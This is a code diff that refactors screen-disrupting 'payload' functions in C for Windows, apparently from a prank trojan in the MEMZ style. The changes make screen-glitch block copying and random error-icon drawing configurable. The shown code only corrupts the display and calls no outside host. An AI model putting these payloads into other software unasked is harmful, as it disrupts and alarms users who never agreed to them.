@@ -59,18 +59,31 @@ PAYLOAD payloadSound() {
 }
 #pragma endregion
 
-PAYLOAD payloadGlitch() {
+PAYLOAD payloadGlitch(int maxSize, int power) {
 	InitHDCs
 
-	int width = random() % 600;
-	int height = random() % 600;
+	HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
+	HDC hdc2 = CreateCompatibleDC(hdc);
+	SelectObject(hdc2, screenshot);
 
-	int x1 = random() % (w - width);
-	int y1 = random() % (h - height);
-	int x2 = random() % (w - width);
-	int y2 = random() % (h - height);
+	BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
 
-	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
+	for (int i = 0; i < power; i++) {
+		int width = random() % maxSize + 1;
+		int height = random() % maxSize + 1;
+
+		int x1 = random() % (w - width);
+		int y1 = random() % (h - height);
+		int x2 = random() % (w - width);
+		int y2 = random() % (h - height);
+
+		BitBlt(hdc2, x1, y1, width, height, hdc2, x2, y2, SRCCOPY);
+	}
+
+	BitBlt(hdc, 0, 0, w, h, hdc2, 0, 0, SRCCOPY);
+
+	DeleteDC(hdc2);
+	DeleteObject(screenshot);
 
 	FreeHDCs
 }
@@ -104,7 +117,7 @@ PAYLOAD payloadTrain(int xPower, int yPower) {
 	FreeHDCs
 }
 
-PAYLOAD payloadDrawErrors() {
+PAYLOAD payloadDrawErrors(int count, int chance) {
 	InitHDCs
 
 	int ix = GetSystemMetrics(SM_CXICON) / 2;
@@ -115,8 +128,9 @@ PAYLOAD payloadDrawErrors() {
 
 	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
 
-	if (random() % 4 == 0) {
-		DrawIcon(hdc, random() % w, random() % h, LoadIcon(NULL, IDI_WARNING));
+	for (int i = 0; i < count; i++) {
+		if ((random() % 100) < chance)
+			DrawIcon(hdc, random() % (w-ix), random() % (h-iy), LoadIcon(NULL, IDI_WARNING));
 	}
 
 	FreeHDCs
